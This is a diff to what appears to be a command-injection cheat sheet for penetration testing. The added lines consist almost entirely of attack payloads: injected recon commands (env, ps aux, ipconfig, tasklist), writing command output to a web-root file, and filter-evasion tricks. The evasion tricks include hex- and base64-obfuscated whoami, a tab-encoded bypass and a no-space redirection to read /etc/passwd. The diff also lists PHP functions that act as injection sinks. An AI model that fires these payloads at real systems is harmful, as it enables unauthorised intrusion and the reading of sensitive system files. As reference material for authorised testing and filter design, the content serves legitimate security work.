@@ -19,6 +19,10 @@ read, function, req, feature, exe, module
 ; ls -la /
 ; id
 ; pwd
+; ifconfig
+; env
+; ps aux
+; hostname
 ```
 ### Alternative Commands Instead Of `/etc/passwd`
 ```bash
@@ -37,6 +41,9 @@ more /etc/passwd
 & net user                                          # Lists users
 & ver                                               # Shows Windows version
 & systeminfo                                        # Detailed system information
+& ipconfig
+& tasklist
+& hostname
 ```
 
 ---
@@ -178,6 +185,15 @@ Start-Sleep -s 10                  # PowerShell sleep
 
 ---
 
+## Output Redirection / File Write
+```bash
+whoami > /var/www/html/output.txt    # Writes command output to web-accessible file
+id > output.txt                      # Saves command output into file
+echo test > proof.txt                # Creates proof file
+```
+
+---
+
 ## Data Exfiltration
 - Methods to extract data from the system.
 ### File Reading
@@ -236,6 +252,17 @@ $(rev<<<'imaohw')
 # Reversed
 ```
 
+## Environment Variables
+```bash
+```bash
+echo $PATH
+echo $HOME
+echo $USER
+echo %USERNAME%
+echo %PATH%
+```
+```
+
 ## Filter Evasion
 ```bash
 'cat'</etc/passwd
@@ -247,6 +274,8 @@ $(rev<<<'imaohw')
 alias ls=whoami;ls
 
 $(echo -e "\x77\x68\x6f\x61\x6d\x69")            # whoami in hex
+echo "d2hvYW1p" | base64 -d                      # Decodes base64 string (whoami in base64)
+$(printf "\x77\x68\x6f\x61\x6d\x69")             # Executes hex-decoded payload
 ```
 
 ---
@@ -258,6 +287,16 @@ $(echo -e "\x77\x68\x6f\x61\x6d\x69")            # whoami in hex
 cat${IFS}/etc/passwd
 cat$IFS/etc/passwd
 {cat,/etc/passwd}
+```
+
+## Tab Bypass
+```bash
+cat%09/etc/passwd      # %09 = Horizontal tab
+```
+
+## No-space redirection trick
+```bash
+cat<>/etc/passwd
 ```
 
 ## Line Feed / Tabs
@@ -288,3 +327,15 @@ X=$'cat\x20/etc/passwd'&&$X
 | \|\|                | %7c%7c                |
 | `                   | %60                   |
 | $()                 | %24%28%29             |
+
+---
+
+## Common Vulnerable Functions
+```php
+system()
+exec()
+shell_exec()
+passthru()
+popen()
+proc_open()
+```
